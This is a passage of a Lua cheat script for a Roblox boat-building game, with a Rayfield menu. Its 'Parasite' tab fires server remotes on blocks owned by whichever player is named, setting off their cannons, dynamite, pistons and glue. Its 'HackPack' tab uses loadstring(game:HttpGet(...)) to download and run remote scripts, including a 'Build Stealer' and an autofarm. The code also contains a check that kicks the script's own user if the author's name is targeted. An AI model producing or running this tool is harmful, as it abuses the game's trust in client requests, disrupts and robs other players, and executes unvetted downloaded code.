    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local FireworkCInput = ParasiteTab:CreateInput({
   Name = "Firework C",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "FireworkC"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local FireworkDInput = ParasiteTab:CreateInput({
   Name = "Firework D",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "FireworkD"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local BalloonInput = ParasiteTab:CreateInput({
   Name = "Balloon",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "BalloonBlock"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local StarBalloonInput = ParasiteTab:CreateInput({
   Name = "Star Shaped Balloon",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "BalloonStarBlock"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local ParachuteInput = ParasiteTab:CreateInput({
   Name = "Parachute",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "ParachuteBlock"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local ShieldInput = ParasiteTab:CreateInput({
   Name = "Shield Generator",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "ShieldGenerator"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local MinigunInput = ParasiteTab:CreateInput({
   Name = "Minigun",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "MiniGun"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local GlueInput = ParasiteTab:CreateInput({
   Name = "Glue",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "Glue"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local TnTInput = ParasiteTab:CreateInput({
   Name = "Dynamite",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "SticksOfTNT"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local MagnetInput = ParasiteTab:CreateInput({
   Name = "Magnet",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "Magnet"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local RetractPistonInput = ParasiteTab:CreateInput({
   Name = "Retract Piston",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local args = {[1] = "Pull"}

local folder = game.Workspace.Blocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

local playerContainer = workspace:WaitForChild("Blocks"):WaitForChild(targetplr)

local function firePistons()
    -- Collect all piston objects with pattern recognition
    local pistons = {}
    
    for _, child in ipairs(playerContainer:GetChildren()) do
        if child.Name:find("^Piston") then
            -- Extract piston number (default to 1 for base "Piston")
            local num = tonumber(child.Name:match("%d+$")) or 1
            table.insert(pistons, {obj = child, num = num})
        end
    end
    
    -- Sort by extracted number
    table.sort(pistons, function(a, b) return a.num < b.num end)
    
    -- Activate sorted pistons
    for _, pistonData in ipairs(pistons) do
        local pPart = pistonData.obj:WaitForChild("PPart")
        local remote = pPart:WaitForChild("ActivateRemote")
        remote:FireServer(unpack(args))
        task.wait(0.1)  -- Delay between activations
    end
end

firePistons()
   end,
})

local ExtendPistonInput = ParasiteTab:CreateInput({
   Name = "Extend Piston",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local args = {[1] = "Push"}

local folder = game.Workspace.Blocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

local playerContainer = workspace:WaitForChild("Blocks"):WaitForChild(targetplr)

local function firePistons()
    -- Collect all piston objects with pattern recognition
    local pistons = {}
    
    for _, child in ipairs(playerContainer:GetChildren()) do
        if child.Name:find("^Piston") then
            -- Extract piston number (default to 1 for base "Piston")
            local num = tonumber(child.Name:match("%d+$")) or 1
            table.insert(pistons, {obj = child, num = num})
        end
    end
    
    -- Sort by extracted number
    table.sort(pistons, function(a, b) return a.num < b.num end)
    
    -- Activate sorted pistons
    for _, pistonData in ipairs(pistons) do
        local pPart = pistonData.obj:WaitForChild("PPart")
        local remote = pPart:WaitForChild("ActivateRemote")
        remote:FireServer(unpack(args))
        task.wait(0.1)  -- Delay between activations
    end
end

firePistons()
   end,
})

local EventsTab = MainWindow:CreateTab("🎉 Events", nil) -- Title, Image
local InfoParagraph = EventsTab:CreateParagraph({Title = "What is it?", Content = "This lets you automatically spend gold to buy blocks when an event starts eg: you choose to spend 3M gold and there are 3 new blocks in an event then the script will automatically buy 1M gold worth of each block"})

local July4Input = EventsTab:CreateInput({
   Name = "July 4th",
   CurrentValue = "",
   PlaceholderText = "Gold Amount [Must be 400 or more]",
   RemoveTextAfterFocusLost = false,
   Flag = "July4",
   Callback = function(Text)
   local month = tonumber(os.date("%m")) -- %m = month (01-12)
local day = tonumber(os.date("%d"))   -- %d = day (01-31)

if month == 7 and day == 4 then
    local budget = Text
    local totalcost = 250 + 300 + 325 + 400  -- Total = 1275
    if budget < totalcost then return end

    local qty = math.floor(budget / totalcost)  -- qty = 3
    local items = {"FireworkA", "FireworkB", "FireworkC", "FireworkD"}

    local args = {
        [1] = items,
        [2] = qty
    }

    workspace:WaitForChild("ItemBoughtFromShop"):InvokeServer(unpack(args))
end  -- Added missing 'end'
   end,
})

local HackPackTab = MainWindow:CreateTab("🎒 HackPack", nil) -- Title, Image

local MainSection = HackPackTab:CreateSection("Hack Pack")

local IYButton = HackPackTab:CreateButton({
   Name = "Infinite Yield",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})

local BuildStealerButton = HackPackTab:CreateButton({
   Name = "Build Stealer",
   Callback = function()
   loadstring(game:HttpGet(("https://raw.githubusercontent.com/catblox1346/StensUIReMake/refs/heads/main/Script/boatbuilderhub_B1"),true))()
   end,
})

local AutofarmButton = HackPackTab:CreateButton({
   Name = "Autofarm(31k/h)",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/TheRealAsu/BABFT/refs/heads/main/Loader.lua'))()
   end,
})

local CreditsTab = MainWindow:CreateTab("💳 Credits", nil) -- Title, Image
local CreditsSection = CreditsTab:CreateSection("Credits to:")

local BasketLabel = CreditsTab:CreateLabel("Basket - Making bind-saving build stealer", nil, Color3.fromRGB(80, 80, 80), false) -- Title, Icon, Color, IgnoreTheme

local WasiLabel = CreditsTab:CreateLabel("GuestNoob101013 - Making the rayfield babft hack pack aka this script", nil, Color3.fromRGB(80, 80, 80), false) -- Title, Icon, Color, IgnoreTheme

local AsuLabel = CreditsTab:CreateLabel("Asu - Making very fast autofarm", nil, Color3.fromRGB(80, 80, 80), false) -- Title, Icon, Color, IgnoreTheme
Rayfield:LoadConfiguration()